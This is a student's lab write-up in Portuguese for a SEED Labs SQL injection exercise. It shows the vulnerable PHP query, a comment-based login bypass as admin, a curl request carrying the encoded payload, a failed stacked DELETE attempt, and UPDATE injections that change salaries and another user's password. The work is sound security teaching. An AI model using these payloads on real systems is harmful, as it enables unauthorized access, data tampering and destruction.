# Semana 8 - SQL Injection Attack

## Task 1 - Get Familiar with SQL Statements

Após correr `show tables` no terminal do `mysql`, conseguimos observar que há 1 tabelas: **credential**<br>
Portanto, se quisermos ver todas as entries da tabela **credential**, podemos fazer:

```sql
SELECT * FROM credential;
```

O resultado é o seguinte:

![image](Semana_8/images/image.png)

Alternativamente, como o que é pedido é especificamente para o utilizador **Alice**, podemos fazer:

```sql
SELECT * FROM credential WHERE Name = "Alice";
```


## Task 2 - SQL Injection Attack on SELECT Statement

### Task 2.1 - SQL Injection Attack from webpage

Para autenticar um utilizador, é utilizado o seguinte código no ficheiro `unsafe_home.php`:

```php
$sql = "SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,nickname,Password
FROM credential
WHERE name= '$input_uname' and Password='$hashed_pwd'";
```

Como podemos observar, os parâmetros não são sanitizados, o que cria uma vulnerabilidade de **SQL Injection**.<br>
Devido a esta vulnerabilidade, como sabemos que o user da conta administrativa tem username `admin`, então podemos dar login com os seguintes dados

![image](Semana_8/images/image2.png)

Após submeter os dados, a seguinte query será realizada pelo servidor:

```php
$sql = "SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,nickname,Password
FROM credential
WHERE name= 'admin'# and Password='$hashed_pwd'";
```

Com isto, conseguimos ser autenticados na conta do **admin**, mesmo sem saber a password.

![image](Semana_8/images/image3.png)


### Task 2.2 - SQL Injection Attack from command line

Esta task é semelhante à anterior, mas pela command line, ou seja, temos que mandar um request utilizando o comando `curl`.<br>

Para fazer isso, inserimos o seguinte comando no terminal:

``` 
curl "http://www.seed-server.com/unsafe_home.php?username=admin%27%23&Password="
```

Neste caso, como precisamos de escapar o caracter `'` e `#` eles são representados com `%27` e `%23`, respetivamente. 

Isto vai fazer com que o servidor faça a mesma query à base de dados que fez na task anterior e temos acesso ao código html da página com a tabela **credential**.

![image](Semana_8/images/image4.png)

### Task 2.3 - Append a new SQL statement

Para tentar tornar um SQL statement em 2, podemos inserir os seguintes dados no login:

`admin'; DELETE * FROM credential; #`

Isto vai eliminar todas as entries na tabela **credential**.<br>
No entanto, quando tentamos fazer isto, recebemos a seguinte mensagem:

![image](Semana_8/images/image5.png)

Após ler a documentação, descobrimos que, para funcionar, era necessário usar-se a função `multi_query()`.

![image](Semana_8/images/image6.png)

Como é utilizada a função `query()`, o nosso ataque que tenta tornar 1 SQL statements em 2 não funciona.

## Task 3 - SQL Injection Attack on UPDATE Statement

### Task 3.1 - Modify your own salary

Após olhar para o ficheiro `unsafe_edit_backend`, notamos que, tal como para fazer login, a query à base de dados não sanitiza os parâmetros, portanto está vulnerável a ataques de SQL Injection.<br>
Embora no site não tenhamos a opção para editar o salário, com um ataque de SQL Injection isso é possível da seguinte forma:

![image](Semana_8/images/image7.png)

Isto seria equivalente a correr a seguinte query:

```php
$sql = "UPDATE credential SET nickname='',email='',address='Rua da Cedofeita', salary='1000000',Password='', PhoneNumber='' where ID=$id;"
```

No final, o perfil da Alice ficou assim:

![image](Semana_8/images/image8.png)

Como podemos observar, o salário da Alice agora é 1000000.

### Task 3.2 - Modify other people’ salary

Para mudar o salário de outra pessoa, podemos fazer um ataque semelhante ao que fizemos na task anterior, exceto que também temos que adicionar uma condição para o ID de outro utilizador.<br>

![image](Semana_8/images/image9.png)

Isto seria equivalente a correr a seguinte query:

```php
$sql = "UPDATE credential SET nickname='',email='',address='',Password='', PhoneNumber='1',salary='1' where ID=2 #where ID=$id;"
```

Após fazer `select * from credential` no terminal, conseguimos observar que o utilizador com ID = 2, o **Boby**, tem agora Phone Number = 1 e Salary = 1.

![image](Semana_8/images/image10.png)

### Task 3.3 - Modify other people’ password

Para mudar a palavra passe de outra pessoa, usamos uma técnica semelhante às anteriores, mas agora alteramos a password. Decidimos alterar a password do utilizador Boby (ID = 2) para `123`. 

![image](Semana_8/images/image11.png)

Após entrar no perfil do Boby, conseguimos ver que o Phone Number é 1

![image](Semana_8/images/image12.png)

Se formos à base de dados e fizermos `select * from credential` observamos o seguinte:

![image](Semana_8/images/image13.png)

Como podemos ver, a **password** do Boby é `40bd001563085fc35165329ea1ff5c5ecbdbbeef`, que é `123` depois de ser encriptado com criptografica sha1.
